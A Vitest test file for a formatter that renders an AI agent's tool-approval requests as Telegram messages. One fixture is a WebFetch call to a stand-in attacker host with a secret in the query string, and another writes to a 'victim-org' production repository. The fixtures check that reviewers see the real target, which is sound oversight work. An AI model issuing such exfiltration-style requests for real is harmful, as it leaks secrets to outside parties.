import { describe, expect, it } from "vitest";
import { formatApprovalText, formatToolLine } from "./telegram-format";

const now = 1_000_000;
const expiresAt = now + 10 * 60_000;

describe("formatApprovalText", () => {
  it("shows a generic tool's target, e.g. the URL of a WebFetch", () => {
    expect(formatApprovalText({ tool: "WebFetch", command: "https://evil.example/x?d=secret", expiresAt }, now)).toBe(
      "🔸 Freigabe: WebFetch\nhttps://evil.example/x?d=secret\n\n⏳ Timeout in 10 min"
    );
  });

  it("shows an MCP tool's path and its other input fields", () => {
    const text = formatApprovalText({
      tool: "mcp__github__create_or_update_file",
      filePath: "README.md",
      command: '{"owner":"victim-org","repo":"prod","branch":"main","content":"x"}',
    }, now);
    expect(text).toBe('🔸 Freigabe: mcp__github__create_or_update_file README.md\n{"owner":"victim-org","repo":"prod","branch":"main","content":"x"}');
  });

  it("clips a long target", () => {
    const text = formatApprovalText({ tool: "mcp__x__y", command: "a".repeat(5000) }, now);
    expect(text.length).toBeLessThan(1600);
    expect(text.endsWith("… (gekürzt)")).toBe(true);
  });

  it("keeps Bash and file-edit cards as before", () => {
    expect(formatApprovalText({ tool: "Bash", command: "ls -la" }, now)).toBe("🔸 Freigabe (Bash):\nls -la");
    expect(formatApprovalText({
      tool: "Write", filePath: "/a.ts", overwrites: true, diff: [{ op: "add", text: "x" }],
    }, now)).toBe("🔸 Freigabe: Write /a.ts (überschreibt bestehende Datei)\n\n+ x");
  });
});

describe("formatToolLine", () => {
  it("names the target of web tools", () => {
    expect(formatToolLine("WebFetch", { url: "https://x.dev", prompt: "p" })).toBe("🔧 WebFetch https://x.dev");
    expect(formatToolLine("WebSearch", { query: "vitest 5" })).toBe("🔧 WebSearch vitest 5");
  });
});
